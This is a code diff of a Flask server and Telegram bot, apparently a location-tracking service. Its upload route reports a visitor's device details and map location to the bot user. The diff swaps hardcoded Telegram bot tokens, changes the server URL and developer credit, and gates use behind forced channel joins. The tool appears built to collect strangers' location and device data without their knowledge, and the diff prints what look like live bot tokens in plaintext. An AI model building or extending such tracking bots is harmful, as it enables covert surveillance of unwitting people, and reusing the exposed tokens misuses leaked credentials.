@@ -9,12 +9,18 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # --- CONFIGURATION ---
-TOKEN = "7888111866:AAEDg57YXrbJfOCor5PM2Rh8aH3mrPsWw-U"
-SERVER_URL = "https://proxy-location-3.onrender.com"
+TOKEN = os.environ.get("BOT_TOKEN", "7888111866:AAEct_q2T6O3Rx0IGIu2gpXS9wN8JMIcpWI")
+SERVER_URL = "https://proxy-93ml.onrender.com"
 
-# Force Join Channels (ID or Username)
-# Note: Public channels ke liye username aur private ke liye ID use hoti hai.
-CHANNELS = ["@proxydominates", "@midnight_xaura", -1003667411246] # Last one is ID for the private link provided
+# Force Join Channels (3 Channels)
+CHANNELS = [
+    "@proxydominates",      # Channel 1
+    "@midnight_xaura",      # Channel 2
+    -1003387459132          # Channel 3 (Private Channel)
+]
+
+# Owner ID
+OWNER_ID = 8740135346
 
 app = Flask(__name__)
 
@@ -179,7 +185,7 @@ def upload():
         f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
         f"🗺 **Map Link:**\n{map_link}\n"
         f"━━━━━━━━━━━━━━━━\n"
-        f"⚡ Developed by: @REVULET"
+        f"⚡ Developed by: @Proxyfxz"
     )
 
     try:
@@ -211,22 +217,26 @@ async def is_subscribed(app, user_id):
             if member.status in ["left", "kicked"]:
                 return False
         except:
-            # Agar bot admin nahi hai ya channel nahi mila
             return False
     return True
 
 # --- BOT HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # Group chat me reply mat karo
+    if update.effective_chat.type in ["group", "supergroup"]:
+        return
+    
     if not await is_subscribed(context.application, user_id):
         buttons = [
-            [InlineKeyboardButton("Join Channel 1", url="https://t.me/proxydominates")],
-            [InlineKeyboardButton("Join Channel 2", url="https://t.me/midnight_xaura")],
-            [InlineKeyboardButton("Join Channel 3", url="https://t.me/+gnyODeNwEwNjZDJl")],
-            [InlineKeyboardButton("Verified Join (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
+            [InlineKeyboardButton("📢 BOT UPDATES", url="https://t.me/proxydominates")],
+            [InlineKeyboardButton("📢 SUPPORT", url="https://t.me/midnight_xaura")],
+            [InlineKeyboardButton("📢 BACKUP", url="https://t.me/+9gNiX6EZV1Q4MTU5")],
+            [InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
         ]
         await update.message.reply_text(
-            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare teenon channels join karne honge.",
+            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare **teenon** channels join karne honge.",
             reply_markup=InlineKeyboardMarkup(buttons)
         )
         return
@@ -235,6 +245,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # Group chat me reply mat karo
+    if update.effective_chat.type in ["group", "supergroup"]:
+        return
+    
     if not await is_subscribed(context.application, user_id):
         await start(update, context)
         return
